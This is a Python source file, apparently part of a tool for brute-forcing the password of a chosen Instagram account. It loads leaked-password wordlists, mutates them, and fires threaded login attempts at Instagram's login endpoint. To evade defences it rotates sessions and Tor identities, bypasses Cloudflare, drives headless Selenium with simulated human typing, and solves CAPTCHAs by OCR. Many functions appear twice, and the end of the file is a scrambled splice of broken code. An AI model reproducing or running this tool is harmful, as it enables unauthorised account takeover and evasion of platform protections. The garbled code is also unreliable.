            'platform': random.choice(['Win32', 'MacIntel', 'Linux x86_64']),
            'cookies_enabled': True,
            'do_not_track': random.choice([True, False]),
            'canvas_fingerprint': hashlib.md5(str(random.random()).encode()).hexdigest()[:16]
        }
        return fingerprint

    def advanced_session_fingerprinting(self, session):
        """Apply advanced fingerprinting to session"""
        fingerprint = self.generate_device_fingerprint()

        # Add fingerprint headers
        session.headers.update({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': fingerprint['language'] + ',en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1' if fingerprint['do_not_track'] else '0',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })

        return session

    def run_network_scan(self):
        """Run network reconnaissance"""
        print("🔍 Running network reconnaissance...")
        network_info = self.get_network_info()

        print(f"📡 Platform: {network_info.get('platform', 'Unknown')}")
        print(f"🌐 External IP: {network_info.get('ip_info', 'Unknown')}")
        print(
            f"🔒 SSL Fingerprint: {network_info.get('ssl_fingerprint', 'Unknown')}")
        print(f"🎭 UA Entropy: {network_info.get('user_agent_entropy', 0)}")

        return network_info

    def load_custom_wordlists(self):
        """Load multiple wordlists for comprehensive attack"""
        wordlists = []
        wordlist_sources = [
            'wordlists/rockyou.txt',
            'wordlists/common_passwords.txt',
            'wordlists/instagram_specific.txt',
            'wordlists/leaked_passwords.txt',
            'wordlists/social_media.txt'
        ]

        for source in wordlist_sources:
            try:
                with open(source, 'r', encoding='utf-8', errors='ignore') as f:
                    passwords = [line.strip() for line in f if line.strip()]
                    wordlists.extend(passwords)
                    print(f"✅ Loaded {len(passwords)} passwords from {source}")
            except:
                continue

        return list(set(wordlists))  # Remove duplicates

    def generate_mutation_passwords(self, base_passwords):
        """Generate password mutations using advanced techniques"""
        mutations = set()

        for password in base_passwords[:100]:  # Limit to prevent memory issues
            # Basic mutations
            mutations.add(password.upper())
            mutations.add(password.lower())
            mutations.add(password.capitalize())

            # Number substitutions
            mutations.add(password + '123')
            mutations.add(password + '2025')
            mutations.add('123' + password)

            # Special character substitutions
            substitutions = {
                'a': '@', 'e': '3', 'i': '1', 'o': '0', 's': '$', 't': '7'
            }

            mutated = password
            for old, new in substitutions.items():
                mutated = mutated.replace(old, new)
            mutations.add(mutated)

            # Reverse passwords
            mutations.add(password[::-1])

            # Common endings
            for ending in ['!', '@', '#', '$', '123', '2025', '2024']:
                mutations.add(password + ending)

        return list(mutations)

    def check_instagram_user_exists(self, username):
        """Check if Instagram user exists"""
        try:
            response = requests.get(
                f'https://www.instagram.com/{username}/', timeout=10)
            if response.status_code == 200:
                if 'Page Not Found' not in response.text:
                    print(f"✅ User {username} exists")
                    return True
            print(f"❌ User {username} does not exist")
            return False
        except:
            print(f"⚠️  Could not verify user {username}")
            return True  # Assume exists to continue attack

    def validate_user_exists_quick(self, session):
        """Quick check if the Instagram user exists"""
        try:
            headers = self.get_advanced_headers('web')
            url = f'https://www.instagram.com/{self.target_username}/'

            response = session.get(url, headers=headers, timeout=15)

            if response.status_code == 200:
                return True
            elif response.status_code == 404:
                print(f"❌ User {self.target_username} does not exist")
                return False
            else:
                print(
                    f"⚠️ User existence check failed with status {response.status_code}")
                return None
        except Exception as e:
            print(f"⚠️ Error checking user existence: {e}")
            return None

    def validate_user_exists_thorough(self, session):
        """More thorough check if the user exists"""
        try:
            # Try GraphQL API
            headers = self.get_advanced_headers('web')

            # Add Instagram-specific headers
            headers.update({
                'X-IG-App-ID': '936619743392459',
                'X-Instagram-AJAX': '1006179778'
            })

            url = f'https://www.instagram.com/api/v1/users/web_profile_info/?username={self.target_username}'

            response = session.get(url, headers=headers, timeout=20)

            # Parse response
            try:
                data = response.json()
                if data.get('status') == 'ok' and data.get('data', {}).get('user'):
                    return True
                else:
                    return False
            except:
                # Try checking response text
                if 'The link you followed may be broken' in response.text:
                    return False
                elif 'Sorry, this page' in response.text:
                    return False
                elif self.target_username in response.text:
                    return True

                print(f"⚠️ Ambiguous user existence response, proceeding anyway")
                return True
        except Exception as e:
            print(f"⚠️ Thorough user existence check failed: {e}")
            # Default to True to continue the attack
            return True

    def hardcore_brute_force_attack(self, max_threads=5, smart_mode=True):
        """Industrial grade brute force attack with multiple methods and threading"""
        print(f"\n💀 HARDCORE INSTAGRAM BRUTE FORCE ATTACK")
        print(f"🎯 Target: {self.target_username}")
        print(f"🔢 Passwords: {len(self.password_list):,}")
        print(f"🧵 Threads: {max_threads}")
        print(f"🌐 Proxies: {len(self.proxy_list)}")
        print(f"🔄 Sessions: {len(self.sessions)}")
        print(f"🧠 Smart Mode: {'ON' if smart_mode else 'OFF'}")
        print("=" * 60)

        # Validate user exists before starting attack
        initial_session = self.get_session()

        # First check - faster but less reliable
        user_exists_quick = self.validate_user_exists_quick(initial_session)
        if user_exists_quick is False:  # Only if definitely False
            retry_session = self.get_session()
            # Second check - more thorough
            if not self.validate_user_exists_thorough(retry_session):
                user_choice = input(
                    f"❓ User {self.target_username} may not exist. Continue anyway? (y/N): ")
                if user_choice.lower() != 'y':
                    print("❌ Attack aborted")
                    return False
            else:
                print(
                    f"✅ Username {self.target_username} validated via thorough check")
        else:
            print(f"✅ Username validation passed or skipped due to uncertainty")

        # Smart password ordering
        if smart_mode:
            self.password_list = self.smart_password_ordering()

        start_time = time.time()
        attempt_number = 0

        # Create logs directory
        os.makedirs('logs', exist_ok=True)

        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = []

            for password in self.password_list:
                if self.found_password:
                    print(f"\n🎉 TERMINATING - PASSWORD FOUND!")
                    break

                future = executor.submit(
                    self.attempt_login_advanced, password, attempt_number)
                futures.append((future, password, attempt_number))
                attempt_number += 1

                # Progress reporting
                if attempt_number % 50 == 0:
                    self.print_progress_stats(attempt_number, start_time)

                # Dynamic thread adjustment
                if smart_mode and attempt_number % 100 == 0:
                    max_threads = self.adjust_thread_count(max_threads)

            # Wait for all futures
            for future, password, num in futures:
                if self.found_password:
                    break
                try:
                    future.result(timeout=30)
                except Exception as e:
                    print(f"⚠️  Future error for {password}: {e}")

        self.print_final_results(start_time)
        return self.found_password is not None

    def smart_password_ordering(self):
        """Smart password ordering based on common patterns"""
        print("🧠 Applying smart password ordering...")

        # Common password patterns with priorities
        high_priority = []
        medium_priority = []
        low_priority = []

        username_variations = [
            self.target_username,
            self.target_username + '123',
            self.target_username + '1',
            self.target_username + '2024',
            self.target_username + '2025',
            '123' + self.target_username,
            self.target_username.upper(),
            self.target_username.lower()
        ]

        common_patterns = [
            'password', '123456', 'password123', 'admin', 'qwerty',
            'letmein', 'welcome', 'monkey', 'dragon', 'master'
        ]

        for password in self.password_list:
            pwd_lower = password.lower()

            # High priority: username variations
            if password in username_variations:
                high_priority.append(password)
            # High priority: very common passwords
            elif pwd_lower in ['123456', 'password', 'qwerty', '123456789']:
                high_priority.append(password)
            # Medium priority: contains username or common patterns
            elif any(pattern in pwd_lower for pattern in [self.target_username.lower()] + common_patterns):
                medium_priority.append(password)
            # Medium priority: simple patterns
            elif len(password) <= 8 and (password.isdigit() or password.isalpha()):
                medium_priority.append(password)
            else:
                low_priority.append(password)

        # Shuffle within categories to avoid patterns
        random.shuffle(high_priority)
        random.shuffle(medium_priority)
        random.shuffle(low_priority)

        ordered_passwords = high_priority + medium_priority + low_priority
        print(
            f"🎯 Ordered: {len(high_priority)} high, {len(medium_priority)} medium, {len(low_priority)} low priority")

        return ordered_passwords

    def adjust_thread_count(self, current_threads):
        """Dynamically adjust thread count based on performance"""
        if self.rate_limit_count > 10:
            new_threads = max(1, current_threads - 2)
            print(f"🔽 Reducing threads: {current_threads} → {new_threads}")
            return new_threads
        elif self.rate_limit_count == 0 and current_threads < 20:
            new_threads = current_threads + 1
            print(f"🔼 Increasing threads: {current_threads} → {new_threads}")
            return new_threads
        return current_threads

    def print_progress_stats(self, attempt_number, start_time):
        """Print detailed progress statistics"""
        elapsed = time.time() - start_time
        rate = attempt_number / elapsed if elapsed > 0 else 0

        print(f"\n� PROGRESS STATS:")
        print(f"   Attempts: {attempt_number:,}/{len(self.password_list):,}")
        print(
            f"   Success: {self.success_count} | Failed: {self.failed_count} | Checkpoints: {self.checkpoint_count}")
        print(
            f"   Rate Limits: {self.rate_limit_count} | Speed: {rate:.1f} attempts/sec")
        print(
            f"   Elapsed: {elapsed/60:.1f}m | Adaptive Delay: {self.adaptive_delay:.1f}s")

    def print_final_results(self, start_time):
        """Print final attack results"""
        elapsed = time.time() - start_time
        total_attempts = self.success_count + self.failed_count + self.checkpoint_count

        print(f"\n� HARDCORE ATTACK COMPLETED!")
        print(f"⏱️  Total Time: {elapsed/60:.1f} minutes")
        print(f"🎯 Total Attempts: {total_attempts:,}")
        print(f"✅ Success: {self.success_count}")
        print(f"❌ Failed: {self.failed_count}")
        print(f"🔒 Checkpoints: {self.checkpoint_count}")
        print(f"⏳ Rate Limits: {self.rate_limit_count}")

        if self.found_password:
            print(f"\n🎉 PWNED! Password: {self.found_password}")
            print(
                f"📁 Details saved in: logs/success_{self.target_username}.json")
        else:
            print(f"\n💔 Target survived the assault")

        if self.checkpoint_count > 0:
            print(
                f"🔒 Checkpoint accounts saved in: logs/checkpoints_{self.target_username}.json")

    def load_proxies(self):
        """Load proxies from multiple sources"""
        print("🌐 Loading proxies from multiple sources...")
        proxies = []
        proxy_sources = [
            'proxy_list.txt',
            '../proxy_list.txt',
            'config/proxies.json',
            'free_configs/proxies.txt'
        ]

        for source in proxy_sources:
            try:
                if source.endswith('.json'):
                    with open(source, 'r') as f:
                        data = json.load(f)
                        new_proxies = data.get('proxies', [])
                        proxies.extend(new_proxies)
                        print(
                            f"   Loaded {len(new_proxies)} proxies from {source}")
                else:
                    with open(source, 'r') as f:
                        new_proxies = [line.strip()
                                       for line in f if line.strip()]
                        proxies.extend(new_proxies)
                        print(
                            f"   Loaded {len(new_proxies)} proxies from {source}")
            except Exception as e:
                print(f"   Failed to load {source}: {e}")
                continue

        # Add some free proxy APIs
        try:
            free_proxies = self.fetch_free_proxies()
            proxies.extend(free_proxies)
        except Exception as e:
            print(f"⚠️  Failed to fetch free proxies: {e}")

        unique_proxies = list(set(proxies))  # Remove duplicates
        print(f"✅ Total unique proxies loaded: {len(unique_proxies)}")
        return unique_proxies

    def fetch_free_proxies(self):
        """Fetch free proxies from public APIs"""
        proxies = []
        try:
            print("🌐 Fetching free proxies...")
            # ProxyList API
            response = requests.get(
                'https://www.proxy-list.download/api/v1/get?type=http', timeout=10)
            if response.status_code == 200:
                new_proxies = response.text.strip().split('\n')
                proxies.extend([p for p in new_proxies if p.strip()])
                print(
                    f"   Found {len(new_proxies)} proxies from proxy-list.download")
        except Exception as e:
            print(f"⚠️  Failed to fetch free proxies: {e}")
        return proxies

    def create_session_pool(self):
        """Create a pool of sessions for rotation"""
        print("🔄 Creating session pool...")
        for i in range(self.session_pool_size):
            try:
                session = self.create_advanced_session()
                self.sessions.append(session)
                if i % 10 == 0:
                    print(
                        f"   Created {i+1}/{self.session_pool_size} sessions...")
            except Exception as e:
                print(f"⚠️  Failed to create session {i+1}: {e}")
                # Create a basic session as fallback
                session = requests.Session()
                self.sessions.append(session)

        print(f"✅ Session pool ready: {len(self.sessions)} sessions")

    def create_advanced_session(self):
        """Create an advanced session with stealth features"""
        session = requests.Session()

        # Try to use cloudscraper if available
        if self.use_cloudflare_bypass and cloudscraper:
            try:
                # Fix browser parameters for cloudscraper
                browser_params = {
                    'browser': 'chrome',
                    'platform': random.choice(['windows', 'darwin']),
                    'desktop': True
                }
                # Create with simpler parameters to avoid errors
                session = cloudscraper.create_scraper(
                    browser=browser_params,
                    delay=10
                )
            except Exception as e:
                print(f"⚠️  Cloudscraper failed, using standard session: 'chrome'")
                session = requests.Session()

        # Advanced retry strategy
        try:
            retry_strategy = Retry(
                total=3,
                backoff_factor=1,
                status_forcelist=[429, 500, 502, 503, 504],
            )

            adapter = HTTPAdapter(max_retries=retry_strategy,
                                  pool_connections=100, pool_maxsize=100)
            session.mount("http://", adapter)
            session.mount("https://", adapter)
        except Exception as e:
            print(f"⚠️  Retry strategy setup failed: {e}")

        # Disable SSL warnings
        try:
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            session.verify = False
        except Exception:
            pass

        return session

    def get_session(self):
        """Get a random session from pool"""
        if self.rotate_sessions and self.sessions:
            return random.choice(self.sessions)
        return self.sessions[0] if self.sessions else requests.Session()

    def get_proxy(self):
        """Get a random proxy - disabled to avoid IPv6 issues"""
        return None

    def get_network_info(self):
        """Get network and system information for advanced fingerprinting"""
        try:
            info = {
                'platform': platform.system() if platform else 'Unknown',
                'hostname': socket.gethostname() if socket else 'Unknown',
                'ip_info': self.get_external_ip(),
                'user_agent_entropy': self.calculate_ua_entropy(),
                'ssl_fingerprint': self.get_ssl_fingerprint()
            }
            return info
        except Exception as e:
            print(f"⚠️  Network info error: {e}")
            return {}

    def get_external_ip(self):
        """Get external IP address"""
        try:
            response = requests.get(
                'https://api.ipify.org?format=json', timeout=5)
            return response.json().get('ip', 'Unknown')
        except:
            return 'Unknown'

    def calculate_ua_entropy(self):
        """Calculate user agent entropy for better randomization"""
        if not self.ua:
            return 0
        try:
            ua_string = str(self.ua.random)
            entropy = len(set(ua_string)) / len(ua_string) if ua_string else 0
            return round(entropy, 3)
        except:
            return 0

    def get_ssl_fingerprint(self):
        """Generate SSL fingerprint"""
        try:
            context = ssl.create_default_context()
            return hashlib.md5(str(context.get_ca_certs()).encode()).hexdigest()[:16]
        except:
            return 'unknown'

    def create_hash_chain(self, data):
        """Create hash chain for password verification"""
        try:
            hash_obj = hashlib.sha256(str(data).encode())
            return hash_obj.hexdigest()
        except:
            return None

    def generate_password_combinations(self, base_password, max_combinations=50):
        """Generate advanced password combinations using itertools"""
        if not itertools:
            return [base_password]

        try:
            combinations = []

            # Character substitutions
            substitutions = {
                'a': '@', 'e': '3', 'i': '1', 'o': '0', 's': '$', 't': '7'
            }

            # Generate substitution combinations
            chars = list(base_password.lower())
            for combo in itertools.product(*[[c, substitutions.get(c, c)] for c in chars]):
                new_password = ''.join(combo)
                if new_password != base_password:
                    combinations.append(new_password)
                if len(combinations) >= max_combinations:
                    break

            return combinations[:max_combinations]
        except Exception as e:
            print(f"⚠️  Password combination error: {e}")
            return [base_password]

    def setup_tor_connection(self):
        """Setup TOR connection for advanced anonymity"""
        print("⚠️  TOR modules disabled to avoid IPv6 issues")
        return False

    def rotate_tor_identity(self):
        """Rotate TOR identity for new IP"""
        if not Controller:
            return False

        try:
            with Controller.from_port(port=9051) as controller:
                controller.authenticate()
                controller.signal(Signal.NEWNYM)
                print("🔄 TOR identity rotated")
                return True
        except Exception as e:
            print(f"⚠️  TOR rotation failed: {e}")
            return False

    async def async_login_attempt(self, session, password, csrf_token, mode='web'):
        """Asynchronous login attempt for better performance"""
        if not aiohttp:
            return await self.sync_to_async_wrapper(self.web_login, session, password, csrf_token)

        try:
            headers = self.get_advanced_headers(mode)
            headers.update({
                'X-CSRFToken': csrf_token,
                'X-Instagram-AJAX': '1',
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': 'https://www.instagram.com/accounts/login/',
                'Content-Type': 'application/x-www-form-urlencoded'
            })

            login_data = {
                'username': self.target_username,
                'password': password,
                'queryParams': '{}',
                'optIntoOneTap': 'false',
                'trustedDeviceRecords': '{}'
            }

            async with aiohttp.ClientSession() as async_session:
                async with async_session.post(
                    'https://www.instagram.com/accounts/login/ajax/',
                    data=login_data,
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=20)
                ) as response:
                    text = await response.text()
                    return self.analyze_response_text(text, password, mode)

        except Exception as e:
            print(f"🔄 Async error with {password}: {e}")
            return False

    async def sync_to_async_wrapper(self, func, *args):
        """Wrapper to run sync functions in async context"""
        if not asyncio:
            return func(*args)

        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, func, *args)

    def analyze_response_text(self, text, password, method):
        """Analyze response text without response object"""
        text_lower = text.lower()

        # Success indicators
        success_indicators = [
            'authenticated', '"status":"ok"', 'logged_in_user', 'sessionid'
        ]

        # Rate limit indicators
        rate_limit_indicators = [
            'rate_limited', 'please wait', 'too many requests', 'spam', 'try again later'
        ]

        # Checkpoint indicators
        checkpoint_indicators = [
            'checkpoint_required', 'challenge_required', 'two_factor_required', 'verification'
        ]

        # Check for success
        if any(indicator in text_lower for indicator in success_indicators):
            print(f"🎯 [{method.upper()}] SUCCESS! Password: {password}")
            return True

        # Check for rate limiting
        if any(indicator in text_lower for indicator in rate_limit_indicators):
            print(f"⏳ [{method.upper()}] Rate limited for: {password}")
            return None

        # Check for checkpoint
        if any(indicator in text_lower for indicator in checkpoint_indicators):
            print(f"🔒 [{method.upper()}] Checkpoint for: {password}")
            self.checkpoint_count += 1
            return False

        # Regular failure
        print(f"❌ [{method.upper()}] Failed: {password}")
        return False

    def get_system_resources(self):
        """Monitor system resources for performance optimization"""
        if not psutil:
            return {}

        try:
            return {
                'cpu_percent': psutil.cpu_percent(interval=1),
                'memory_percent': psutil.virtual_memory().percent,
                'disk_usage': psutil.disk_usage('/').percent,
                'network_io': psutil.net_io_counters()._asdict() if psutil.net_io_counters() else {}
            }
        except Exception as e:
            print(f"⚠️  Resource monitoring error: {e}")
            return {}

    def optimize_performance(self):
        """Optimize performance based on system resources"""
        resources = self.get_system_resources()

        if resources.get('cpu_percent', 0) > 80:
            self.adaptive_delay *= 1.2
            print("🔽 High CPU usage - increasing delay")
        elif resources.get('cpu_percent', 0) < 30:
            self.adaptive_delay *= 0.9
            print("🔼 Low CPU usage - decreasing delay")

        if resources.get('memory_percent', 0) > 85:
            print("⚠️  High memory usage detected")

        return resources

    def selenium_login_attempt(self, password):
        """Selenium-based login for bypassing advanced detection"""
        if not uc or not webdriver:
            print("⚠️  Selenium modules not available")
            return False

        try:
            options = uc.ChromeOptions()
            options.add_argument('--headless')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-gpu')
            options.add_argument('--window-size=1920,1080')

            # Random user agent
            ua = random.choice(self.web_agents)
            options.add_argument(f'--user-agent={ua}')

            driver = uc.Chrome(options=options)

            try:
                driver.get('https://www.instagram.com/accounts/login/')
                time.sleep(random.uniform(2, 4))

                # Wait for elements
                username_input = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.NAME, "username"))
                )
                password_input = driver.find_element(By.NAME, "password")

                # Human-like typing
                self.human_type(username_input, self.target_username)
                time.sleep(random.uniform(0.5, 1.5))
                self.human_type(password_input, password)
                time.sleep(random.uniform(1, 2))

                # Submit
                login_button = driver.find_element(
                    By.XPATH, "//button[@type='submit']")
                login_button.click()

                # Wait for response
                time.sleep(random.uniform(3, 5))

                # Check for success indicators
                current_url = driver.current_url
                page_source = driver.page_source.lower()

                success_indicators = ['instagram.com/' +
                                      self.target_username, 'feed', 'home']
                if any(indicator in current_url.lower() for indicator in success_indicators):
                    print(f"🎯 [SELENIUM] SUCCESS! Password: {password}")
                    return True
                elif 'challenge' in current_url or 'checkpoint' in page_source:
                    print(f"🔒 [SELENIUM] Checkpoint for: {password}")
                    self.checkpoint_count += 1
                    return False
                else:
                    print(f"❌ [SELENIUM] Failed: {password}")
                    return False

            finally:
                driver.quit()

        except Exception as e:
            print(f"🌐 Selenium error with {password}: {e}")
            return False

    def human_type(self, element, text):
        """Simulate human typing patterns"""
        for char in text:
            element.send_keys(char)
            time.sleep(random.uniform(0.05, 0.15))

    def solve_captcha(self, captcha_image_path):
        """Solve CAPTCHA using OCR or external service"""
        if not pytesseract or not Image:
            print("⚠️  CAPTCHA solving modules not available")
            return None

        try:
            image = Image.open(captcha_image_path)
            text = pytesseract.image_to_string(image)
            return text.strip()
        except Exception as e:
            print(f"⚠️  CAPTCHA solving error: {e}")
            return None

    def enhanced_proxy_check(self, proxy):
        """Enhanced proxy validation with multiple endpoints"""
        test_urls = [
            'https://httpbin.org/ip',
            'https://api.ipify.org?format=json',
            'https://www.instagram.com'
        ]

        proxy_dict = {'http': proxy, 'https': proxy}

        for url in test_urls:
            try:
                response = requests.get(url, proxies=proxy_dict, timeout=10)
                if response.status_code == 200:
                    return True
            except:
                continue
        return False

    def smart_proxy_rotation(self):
        """Smart proxy rotation based on success rate"""
        working_proxies = []

        print("🔍 Validating proxies...")
        for proxy in self.proxy_list[:20]:  # Test first 20 proxies
            if self.enhanced_proxy_check(proxy):
                working_proxies.append(proxy)
                print(f"✅ Working proxy: {proxy}")
            else:
                print(f"❌ Dead proxy: {proxy}")

        self.proxy_list = working_proxies
        print(f"✅ Validated {len(working_proxies)} working proxies")

    def generate_device_fingerprint(self):
        """Generate realistic device fingerprint"""
        fingerprint = {
            'screen_resolution': random.choice(['1920x1080', '1366x768', '1440x900', '1536x864']),
            'timezone': random.choice(['-8', '-5', '0', '+1', '+8']),
            'language': random.choice(['en-US', 'en-GB', 'es-ES', 'fr-FR']),
            'platform': random.choice(['Win32', 'MacIntel', 'Linux x86_64']),
            'cookies_enabled': True,
            'do_not_track': random.choice([True, False]),
            'canvas_fingerprint': hashlib.md5(str(random.random()).encode()).hexdigest()[:16]
        }
        return fingerprint

    def advanced_session_fingerprinting(self, session):
        """Apply advanced fingerprinting to session"""
        fingerprint = self.generate_device_fingerprint()

        # Add fingerprint headers
        session.headers.update({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': fingerprint['language'] + ',en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1' if fingerprint['do_not_track'] else '0',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })

        return session

    def run_network_scan(self):
        """Run network reconnaissance"""
        print("🔍 Running network reconnaissance...")
        network_info = self.get_network_info()

        print(f"📡 Platform: {network_info.get('platform', 'Unknown')}")
        print(f"🌐 External IP: {network_info.get('ip_info', 'Unknown')}")
        print(
            f"🔒 SSL Fingerprint: {network_info.get('ssl_fingerprint', 'Unknown')}")
        print(f"🎭 UA Entropy: {network_info.get('user_agent_entropy', 0)}")

        return network_info

    def load_custom_wordlists(self):
        """Load multiple wordlists for comprehensive attack"""
        wordlists = []
        wordlist_sources = [
            'wordlists/rockyou.txt',
            'wordlists/common_passwords.txt',
            'wordlists/instagram_specific.txt',
            'wordlists/leaked_passwords.txt',
            'wordlists/social_media.txt'
        ]

        for source in wordlist_sources:
            try:
                with open(source, 'r', encoding='utf-8', errors='ignore') as f:
                    passwords = [line.strip() for line in f if line.strip()]
                    wordlists.extend(passwords)
                    print(f"✅ Loaded {len(passwords)} passwords from {source}")
            except:
                continue

        return list(set(wordlists))  # Remove duplicates

    def generate_mutation_passwords(self, base_passwords):
        """Generate password mutations using advanced techniques"""
        mutations = set()

        for password in base_passwords[:100]:  # Limit to prevent memory issues
            # Basic mutations
            mutations.add(password.upper())
            mutations.add(password.lower())
            mutations.add(password.capitalize())

            # Number substitutions
            mutations.add(password + '123')
            mutations.add(password + '2025')
            mutations.add('123' + password)

            # Special character substitutions
            substitutions = {
                'a': '@', 'e': '3', 'i': '1', 'o': '0', 's': '$', 't': '7'
            }

            mutated = password
            for old, new in substitutions.items():
                mutated = mutated.replace(old, new)
            mutations.add(mutated)

            # Reverse passwords
            mutations.add(password[::-1])

            # Common endings
            for ending in ['!', '@', '#', '$', '123', '2025', '2024']:
                mutations.add(password + ending)

        return list(mutations)

    def check_instagram_user_exists(self, username):
        """Check if Instagram user exists"""
        try:
            response = requests.get(
                f'https://www.instagram.com/{username}/', timeout=10)
            if response.status_code == 200:
                if 'Page Not Found' not in response.text:
                    print(f"✅ User {username} exists")
                    return True
            print(f"❌ User {username} does not exist")
            return False
        except:
            print(f"⚠️  Could not verify user {username}")
            return True  # Assume exists to continue attack

    def validate_user_exists_quick(self, session):
        """Quick check if the Instagram user exists"""
        try:
            headers = self.get_advanced_headers('web')
            url = f'https://www.instagram.com/{self.target_username}/'

            response = session.get(url, headers=headers, timeout=15)

            if response.status_code == 200:
                return True
            elif response.status_code == 404:
                print(f"❌ User {self.target_username} does not exist")
                return False
            else:
                print(
                    f"⚠️ User existence check failed with status {response.status_code}")
                return None
        except Exception as e:
            print(f"⚠️ Error checking user existence: {e}")
            return None

    def validate_user_exists_thorough(self, session):
        """More thorough check if the user exists"""
        try:
            # Try GraphQL API
            headers = self.get_advanced_headers('web')
            # Add Instagram-specific headers
            headers.update({
                'X-IG-App-ID': '936619743392459',
                'X-Instagram-AJAX': '1006179778'
            })

            url = f'https://www.instagram.com/api/v1/users/web_profile_info/?username={self.target_username}'

            response = session.get(url, headers=headers, timeout=20)

            # Parse response
            try:
                data = response.json()
                if data.get('status') == 'ok' and data.get('data', {}).get('user'):
                    return True
                else:
                    return False
            except:
                # Try checking response text
                if 'The link you followed may be broken' in response.text:
                    return False
                elif 'isn\'t_username' in response.text:
                    return False
                elif 'This page' in response.text:
                    return True
                else:
                    print("Ambiguous user existence response, proceeding anyway")
                    return True

        except Exception as e:
            print(f"User existence check failed: {e}")
            # Return True to continue the attack
            return True

    def run_smart_attack(self, password_list, smart_mode=True):
        """Run the brute force attack with smart features"""
        print(f"\n🎯 STARTING INSTAGRAM BRUTE FORCE ATTACK")
        print(f"Target: {self.target_username}")
        print(f"Passwords loaded: {len(password_list)}")
        print(f"Smart Mode: {'ON' if smart_mode else 'OFF'}")
        print("=" * 60)

        # Initial user existence check
        print("🔍 Checking if target user exists...")
        initial_session = self.get_session()

        user_exists = self.validate_user_exists_quick(initial_session)
        if user_exists is False:
            print(
                f"⚠️ User {self.target_username} may not exist. Continue anyway? (y/N): ")
            choice = input().lower()
            if choice != 'y':
                print("Attack aborted")
                return False

        return True

    def hardcore_brute_force_attack(self, max_threads=5, smart_mode=True):
        """Industrial grade brute force attack with multiple methods and threading"""
        print(f"\n💀 HARDCORE INSTAGRAM BRUTE FORCE ATTACK")
        print(f"🎯 Target: {self.target_username}")
        print(f"🔢 Passwords: {len(self.password_list):,}")
        print(f"🧵 Threads: {max_threads}")
        print(f"🌐 Proxies: {len(self.proxy_list)}")
        print(f"🔄 Sessions: {len(self.sessions)}")
        print(f"🧠 Smart Mode: {'ON' if smart_mode else 'OFF'}")
        print("=" * 60)

        # Validate user exists before starting attack
        initial_session = self.get_session()

        # Apply smart password ordering if enabled
        if smart_mode:
            self.password_list = self.smart_password_ordering()

        # First check - faster but less reliable
        user_exists_quick = self.validate_user_exists_quick(initial_session)
        if user_exists_quick is False:  # Only if definitely False
            retry_session = self.get_session()
            # Second check - more thorough
            if not self.validate_user_exists_thorough(retry_session):
                user_choice = input(
                    f"❓ User {self.target_username} may not exist. Continue anyway? (y/N): ")
                if user_choice.lower() != 'y':
                    print("❌ Attack aborted")
                    return False
            else:
                print(
                    f"✅ Username {self.target_username} validated via thorough check")
        else:
            print(f"✅ Username validation passed or skipped due to uncertainty")

        # Start the actual attack
        start_time = time.time()
        attempt_number = 0

        # Create logs directory
        os.makedirs('logs', exist_ok=True)

        # Adjust thread count if needed
        max_threads = self.adjust_thread_count(max_threads)

        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = []
            for password in self.password_list:
                if self.found_password:
                    print(f"\n🎉 TERMINATING - PASSWORD FOUND!")
                    break

                future = executor.submit(
                    self.attempt_login_secure, password, attempt_number)
                futures.append(future)
                attempt_number += 1

                # Progress reporting
                if attempt_number % 10 == 0:
                    self.print_progress_stats(attempt_number, start_time)

            # Wait for all futures to complete
            for future in futures:
                if self.found_password:
                    break
                future.result()

        # Final results
        end_time = time.time()
        duration = end_time - start_time

        if self.found_password:
            print(f"\n🎉 SUCCESS! Password found: {self.found_password}")
            self.save_result(self.found_password, duration)
        else:
            print(
                f"\n❌ Attack completed. No password found after {attempt_number} attempts")

        self.print_final_stats(duration)
        return self.found_password
                    breakout = 30)

                future = executor.submit(print(f"⚠️  Future error for {password}: {e}")
                    self.attempt_login_advanced, password, attempt_number)
                futures.append((future, password, attempt_number))
                attempt_number += 1 return self.found_password is not None

                # Progress reporting
                if attempt_number % 50 == 0: erns"""
                    self.print_progress_stats(attempt_number, start_time)        print("🧠 Applying smart password ordering...")

                # Dynamic thread adjustmentpatterns with priorities
                if smart_mode and attempt_number % 100 == 0:
                    max_threads = self.adjust_thread_count(max_threads) []
        low_priority = []
            # Wait for all futures
            for future, password, num in futures:
                if self.found_password:
                    break',
                try:
                    future.result(timeout=30)
                except Exception as e:,
                    print(f"⚠️  Future error for {password}: {e}")
,
        self.print_final_results(start_time)   self.target_username.lower()
        return self.found_password is not None        ]

    def smart_password_ordering(self):
        """Smart password ordering based on common patterns"""rty',
        print("🧠 Applying smart password ordering...")   'letmein', 'welcome', 'monkey', 'dragon', 'master'
        ]
        # Common password patterns with priorities
        high_priority = []st:
        medium_priority = []            pwd_lower = password.lower()
        low_priority = []
s
        username_variations = [:
            self.target_username,
            self.target_username + '123',
            self.target_username + '1',word', 'qwerty', '123456789']:
            self.target_username + '2024',
            self.target_username + '2025',
            '123' + self.target_username,ttern in [self.target_username.lower()] + common_patterns):
            self.target_username.upper(),d)
            self.target_username.lower()
        ]d.isdigit() or password.isalpha()):
edium_priority.append(password)
        common_patterns = [
            'password', '123456', 'password123', 'admin', 'qwerty',                low_priority.append(
                password)
            'letmein', 'welcome', 'monkey', 'dragon', 'master'
        ]o avoid patterns

        for password in self.password_list:ty)
            pwd_lower = password.lower()        random.shuffle(low_priority)

            # High priority: username variationsd_passwords = high_priority + medium_priority + low_priority
            if password in username_variations:
                high_priority.append(password)            f"🎯 Ordered: {len(high_priority)} high, {len(medium_priority)} medium, {len(low_priority)} low priority")
            # High priority: very common passwords
            elif pwd_lower in ['123456', 'password', 'qwerty', '123456789']:        return ordered_passwords
